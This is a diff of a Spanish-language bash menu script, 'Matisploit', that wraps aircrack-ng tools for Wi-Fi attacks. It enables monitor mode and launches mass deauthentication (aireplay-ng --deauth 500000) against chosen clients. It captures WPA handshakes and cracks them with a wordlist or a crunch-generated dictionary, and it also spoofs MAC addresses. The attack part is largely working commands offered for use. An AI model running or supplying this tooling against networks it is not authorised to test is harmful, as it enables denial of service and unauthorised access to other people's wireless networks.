@@ -1,12 +1,5 @@
 #!/bin/bash
 source mtsconfig.sh
-function check_config() {
-
-	if [  ]
-	then 
-	check_config();
-	fi
-}
 ##############################################################FUNCIONES#########################################################################
 function activar_monitor() {
 echo "########MONITOR##########"
@@ -15,9 +8,7 @@ read -p " mts ▷▷▷ " s15
 if [ $s15 == y ]
 then
 sudo airmon-ng check kill
-sudo airmon-ng start $interfaz
-
-sleep 1 
+sudo airmon-ng start $interfaz 
 mts
 else
 mtsconfig
@@ -31,7 +22,6 @@ if [ $s15 == y ]
 then
 sudo airmon-ng stop $monitor
 sudo service NetworkManager start
-sleep 1
 mts
 else
 mts
@@ -39,10 +29,9 @@ fi
 }
 ##############################################
 function limpiar_aircrack() {
-echo "Especifique directorio a limpiar"
-read -p " mts ▷▷▷ "  cleann
 echo "Borrando archivos y saliendo.."
-cd $cleann
+
+cd $HOME
 sudo rm *.csv
 sudo rm *.cap
 sudo rm *.netxml
@@ -57,7 +46,6 @@ echo -e " $green DIST-UPDATING..################################################
 sudo apt-get dist-upgrade -y
 }
 
-##############################################
 function desautenticar() {
 sudo airmon-ng check kill
 sudo  airmon-ng start $interfaz
@@ -83,9 +71,7 @@ read -p " mts ▷▷▷ "  macr2
 aireplay-ng --deauth 500000 -a $macr2 -c $dvictim  $monitor
 fi
 }
-##############################################################
 
-##############################################
 function crack_wifi() {
 sudo airmon-ng check kill
 sudo airmon-ng start $interfaz
@@ -96,9 +82,8 @@ read canal
 echo "Ingrese la MAC"
 read macr
 sudo airodump-ng -c $canal --bssid $macr $monitor #Se ven los dispositivos conectados al ap
-echo -e "$red Ingrese ESSID para capturar handshake y haga un ataque de desautenticación $nc "
+echo -e "$red Ingrese ESSID para capturar handshake , abra una pestaña y haga un ataque de desautenticación $nc "
 read essid
-gnome-terminal --tab
 sudo airodump-ng -c $canal --bssid $macr $monitor -w $essid #Se deja en este modo , a espera de capturar el handshake
 }
 
@@ -110,7 +95,6 @@ if [ $dispositivo == '' ]
 then
 $dispositivo=$interfaz
 echo "$dispositivo"
-sleep 2
 fi
 echo " 1)RESET MAC"
 echo " 2)NUEVA MAC"
@@ -142,25 +126,7 @@ sudo ifconfig $dispositivo up
 fi
 fi
 }
-###################################################################################################################################
-function crear_app() {
-echo "
-[Desktop Entry]
-Name=<Nombre de tu app>
-Encoding=UTF-8
-Exec=sh -c <Programa a ejecutar en shell>
-Icon=<nombre de tu imagen .png>
-StartupNotify=false
-Terminal=true
-Type=Application
-Categories=05-password-attacks;05-05-profile;
-X-Kali-Package=crunch
-
-" >> /usr/share/applications/$file_desktop.desktop
-gedit /usr/share/applications/$file_desktop.desktop
-}
-##################################################################################################################################
-function ataques_wifi(){
+function ataques_wifi() {
 echo -e "	$blue 1] Ataque de fuerza bruta con diccionario a wifi	$nc"
 echo -e "	$blue 2] Ataque DoS a cliente/s				$nc"
 echo -e "	$blue 3] Crunch on the go				$nc"
@@ -172,11 +138,11 @@ case $s12 in
 	1)
 
 crack_wifi
-echo "Especifique archivo.cap"
+echo "Especifique solo el nombre del archivo.cap"
 read capfile
-echo "Ahora especifique la ubicacion del diccionario[/root/Descargas/rockyou.txt ]"
+echo "Ahora especifique solo el nombre del diccionario"
 read pathbf
-sudo aircrack-ng -w $pathbf $capfile #Se crackea el archivo.cap
+sudo aircrack-ng -w $HOME/$pathbf $HOME/$capfile #Se crackea el archivo.cap
 echo "Desea limpiar los archivos? [y/n]"
 read -p " mts ▷▷▷ "  clear
 if [ $clear == y ]
@@ -193,7 +159,14 @@ desautenticar
 crack_wifi
 echo "ESSID:"
 read -p " mts ▷▷▷ "  essidcrunch
- crunch 10 10 9876543210 | aircrack-ng  $HOME/$essidcrunch-01.cap -e $essidcrunch -w- 
+echo "Minimo de Caracteres ? "
+read -p " mts ▷▷▷ "  min
+echo "Máximo de Caracteres ? "
+read -p " mts ▷▷▷ "  max
+echo "Que Caracteres desea usar? "
+read -p " mts ▷▷▷ "  caracteres
+echo "OK. Generando diccionario con los caracteres "
+ crunch $min $max $caracteres | aircrack-ng  $HOME/$essidcrunch-01.cap -e $essidcrunch -w- 
 echo "Desea limpiar los archivos? [y/n]"
 read -p " mts ▷▷▷ "  clear
 if [ $clear == y ]
@@ -278,7 +251,6 @@ mts
 fi
 else
 echo -e "$green ERROR, no tipeaste un numero $nc"
-sleep 2
 adivinar
 fi
 }
@@ -306,12 +278,11 @@ echo "Ejemplo: mts 3 "
 echo "Esto Actualiza el sistema"
 }
 
+
 case $1 in 	
 	-a)
 actualizar_sistema
 ;;
-
-
 	-b)
 btattack
 ;;
@@ -377,7 +348,6 @@ sudo nano /usr/local/bin/mtsconfig.sh
 	10)
 sudo nano /usr/local/bin/matisploit
 ;;
-
 	-h)
 helpp
 ;;
@@ -412,12 +382,12 @@ echo -e "              $green
 
 
 echo "					"										
-echo "Bienvenido a Matisploit $USER "
+echo "Bienvenido a Matisploit $USER .  Tu tarjeta de red es $interfaz y su monitor es $monitor "
 echo -e "$green SELECCIONE UNA OPCION $nc"
 echo "Tipee 'helpp' para ayuda"
 
 echo -e "$green  ▷▷▷ 1] Ataques wifi				$nc"
-echo -e "$grey  ▷▷▷ 2] Fuerza bruta / phishing		$nc"
+echo -e "$grey  ▷▷▷ 2] Crear diccionario de contraseñas		$nc"
 echo -e "$yellow  ▷▷▷ 3] Actualizar sistema			$nc"
 echo -e "$green  ▷▷▷ 4] Activar modo monitor			$nc"
 echo -e "$red  ▷▷▷ 5] Desactivar modo monitor		$nc"
@@ -426,7 +396,7 @@ echo -e "$Cyan  ▷▷▷ 7] Borrar residuos de aircrack		$nc"
 echo -e "$Cafe  ▷▷▷ 8] 'Juega a Elige un número'		$nc"
 echo -e "$Fiuscha  ▷▷▷ 9] Configurar mts			$nc"
 echo -e "$Fiuscha  ▷▷▷ 10] Editar mts			$nc" 
-echo -e "$blue  ▷▷▷ 11] Aplicaciones	$nc"	
+echo -e "$blue  ▷▷▷ 11] Calculadora	$nc"	
 ################################################
 read -p " mts ▷▷▷ " s1 
 ################################################
@@ -480,40 +450,9 @@ sudo nano /usr/local/bin/mtsconfig.sh
 sudo nano /usr/local/bin/matisploit
 ;;
 	11)
-echo " 1] Crear Aplicación"
-echo " 2] Desinstalar un programa"
-echo -e "$red 3] Eliminar usuario $nc"
-read -p " mts ▷▷▷ " s11
-case $s11 in
-	1)
-read -p "Nombre del archivo .desktop : " file_desktop
-read -p "Ruta hacia ícono de imagen (24x24) : " path_to_image
-case $path_to_image in
-	"")
-crear_app
 
-;;	
-	*)
-cp $path_to_image /usr/share/icons/hicolor/24x24/apps
-crear_app
-;;
-esac
-;;
-	2)
-echo "Introduzca el nombre del programa a desinstalar"
-read -p " mts ▷▷▷ " programa_a_desinstalar
-sudo apt-get purge --auto-remove $programa_a_desinstalar
-;;
 
-	*) 
-echo -e "$red Entrada invalida: Seleccione un número del 1 al 2 $nc"
-sleep 1
-mts
 ;;
-#####
-esac
-;;
-###########################################
 	helpp)
 helpp
 ;;
@@ -521,14 +460,9 @@ helpp
 echo -e "$red Entrada invalida: Seleccione un número del 1 al 11 $nc"
 sleep 1
 mts
-;;
-	
+;;	
 esac
-
-
-
 ;;
-
 esac
 
 
